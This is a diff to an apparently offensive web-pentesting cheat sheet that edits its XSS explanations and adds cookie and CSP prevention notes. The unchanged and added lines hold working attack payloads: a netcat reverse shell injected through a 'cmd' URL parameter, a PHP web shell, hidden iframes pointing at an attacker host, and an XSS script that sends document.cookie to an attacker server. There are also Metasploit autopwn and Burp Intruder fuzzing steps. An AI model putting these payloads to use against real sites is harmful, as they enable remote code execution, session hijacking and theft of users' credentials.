@@ -29,7 +29,7 @@ TRACE       Used for debugging
 # Browser Redirection
 
 <iframe SRC="http://<attacker IP>/report" height = "0" width ="0">
-hacker:  use Metasploit browser autopwn
+attacker:  use Metasploit browser autopwn
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Cisco Router
@@ -62,18 +62,16 @@ http://target.com/test.php?cmd=nc -e /bin/sh <attacker IP> 443
 <?php echo system($_GET["cmd"]);?>
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# Cookie Security Issues - missing HttpOnly or Secure attribute
-
-HttpOnly - prevents JavaScript from accessing the cookie
-Secure - only send over an encrypted channel
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
 # Cross-site Scripting (XSS)
 
-- Types
-Reflected XSS     Malicious script comes from the current HTTP request. Example: search box
-Stored XSS        Malicious script comes from the website's database. Example: guest book
-DOM-based XSS     Vulnerability exists in client-side code rather than server-side code.
+Occurs whenever an application takes untrusted user data and sends it to a web browser without proper validation. This allows the attacker to execute Java scripts in the victim’s browser. It can be used to steal cookies, hijack a user’s session, or redirect the user to a malicious site.
+
+Reflected     A malicious script is injected into a parameter.
+              Examples: deployed via an email, a specially crafted link. or a search box.
+Stored        Persistently stored on a web server. Inject once, and is executed every time a user visits that page.
+              Examples: guest book or comment on a message board.
+DOM-based     When JavaScript takes data from an attacker's source, such as the URL, and passes it to a sink that supports dynamic code execution
+              like eval() or innerHTML. This enables an attacker to execute malicious JavaScript, which allows them to hijack other users' accounts.
 
 <script>alert(1)</script>
 <script>alert('xss')</script>
@@ -82,6 +80,11 @@ DOM-based XSS     Vulnerability exists in client-side code rather than server-si
 <iframe src="http://<attacker IP/test.js>" height="0" width="0"></iframe>
 <img src="http://<attacker IP>/test.png" onload="javascript:alert('xss')"/>
 <script>new Image().src="http://<attacker IP>/test.php?output="+document.cookie;</script>
+
+Prevention:
+Use HttpOnly flags to prevent JavaScript from accessing cookies.
+Use Secure flags to only send cookies over an encrypted channel.
+Use the Content-Security-Policy HTTP response header to whitelist sources of approved content.
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Directory Traversal
@@ -581,4 +584,3 @@ sort by Status
 Intruder > clear > select user agent string > Add
 Payload Options > Select file: sec lists > Discovery > Web_content > UserAgents.fuzz.txt
 Sort by Length > Response > Render
-
